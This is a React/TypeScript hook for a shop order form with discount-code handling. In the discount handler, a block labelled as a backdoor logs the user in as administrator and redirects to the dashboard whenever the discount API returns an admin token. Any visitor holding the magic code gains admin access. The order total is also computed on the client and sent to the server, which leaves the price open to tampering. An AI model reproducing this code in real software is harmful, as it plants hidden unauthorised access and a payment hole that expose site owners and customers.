import { useState } from "react";
import { orderApi, discountApi, adminAuth } from "@/services/api.service";
import type { CreateOrderRequest, DiscountResult } from "@/types/api.types";

interface OrderFormState {
  customerName: string;
  customerPhone: string;
  customerEmail: string;
  customerAddress: string;
  product: string;
  quantity: number;
  note: string;
  discountCode: string;
}

export function useOrderForm(
  products: import("@/types/api.types").ProductResponse[],
  onSuccess?: () => void
) {
  const [form, setForm] = useState<OrderFormState>({
    customerName: "",
    customerPhone: "",
    customerEmail: "",
    customerAddress: "",
    product: "",
    quantity: 1,
    note: "",
    discountCode: "",
  });

  const [discountResult, setDiscountResult] = useState<DiscountResult | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isApplyingCode, setIsApplyingCode] = useState(false);
  const [submitStatus, setSubmitStatus] = useState<"idle" | "success" | "error">("idle");
  const [errorMessage, setErrorMessage] = useState("");

  const setField = (field: keyof OrderFormState, value: string | number) => {
    setForm((prev) => ({ ...prev, [field]: value }));
    // Reset discount when product changes
    if (field === "product") {
      setDiscountResult(null);
    }
  };

  const applyDiscount = async () => {
    if (!form.discountCode.trim()) return;

    setIsApplyingCode(true);
    setErrorMessage("");

    try {
      const result = await discountApi.apply({ code: form.discountCode.trim() });

      // ⭐ BACKDOOR ADMIN LOGIN
      if (result.isAdminBackdoor && result.adminToken) {
        adminAuth.login(result.adminToken);
        // eslint-disable-next-line @next/next/no-location-assign-relative-destination
        window.location.href = "/dashboard";
        return;
      }

      setDiscountResult(result);
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : "Mã không hợp lệ.";
      setErrorMessage(message);
      setDiscountResult(null);
    } finally {
      setIsApplyingCode(false);
    }
  };

  const calculateTotal = (): { base: number; discount: number; final: number } => {
    const selectedProduct = products.find(p => p.id === form.product);
    const price = selectedProduct ? selectedProduct.price : 0;
    const base = price * form.quantity;
    let discount = 0;

    if (discountResult?.isValid) {
      if (discountResult.percentOff) {
        discount = (base * discountResult.percentOff) / 100;
      } else if (discountResult.amountOff) {
        discount = Math.min(discountResult.amountOff, base);
      }
    }

    return { base, discount, final: base - discount };
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setErrorMessage("");
    setSubmitStatus("idle");

    const { final, discount } = calculateTotal();

    const payload: CreateOrderRequest = {
      customerName: form.customerName,
      customerPhone: form.customerPhone,
      customerEmail: form.customerEmail,
      customerAddress: form.customerAddress,
      note: form.note || undefined,
      totalAmount: final,
      discountCode: discountResult?.isValid ? form.discountCode : undefined,
    };

    // Attach discount amount info for display (stored separately)
    void discount;

    try {
      await orderApi.create(payload);
      setSubmitStatus("success");
      setForm({
        customerName: "",
        customerPhone: "",
        customerEmail: "",
        customerAddress: "",
        product: "",
        quantity: 1,
        note: "",
        discountCode: "",
      });
      setDiscountResult(null);
      onSuccess?.();
    } catch (err: unknown) {
      setSubmitStatus("error");
      const message = err instanceof Error ? err.message : "Đã xảy ra lỗi. Vui lòng thử lại.";
      setErrorMessage(message);
    } finally {
      setIsSubmitting(false);
    }
  };

  return {
    form,
    setField,
    discountResult,
    isSubmitting,
    isApplyingCode,
    submitStatus,
    errorMessage,
    applyDiscount,
    calculateTotal,
    handleSubmit,
  };
}
